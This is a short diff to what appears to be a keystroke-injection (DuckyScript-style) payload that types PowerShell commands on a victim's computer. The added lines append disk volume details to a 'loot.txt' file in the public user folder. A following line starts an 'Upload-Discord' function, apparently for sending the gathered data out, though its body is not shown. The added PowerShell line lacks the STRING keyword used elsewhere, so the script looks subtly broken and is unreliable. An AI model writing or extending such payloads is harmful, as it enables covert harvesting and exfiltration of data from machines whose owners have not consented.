@@ -54,6 +54,10 @@ STRING Get-CimInstance -ClassName Win32_Processor | Select-Object -ExcludeProper
 DELAY 2000
 ENTER
 DELAY 2000
+Get-Volume | Out-File C:\Users\Public\loot.txt -Force -append
+DELAY 2000
+ENTER
+DELAY 2000
 STRING function Upload-Discord {
 DELAY 2000
 ENTER
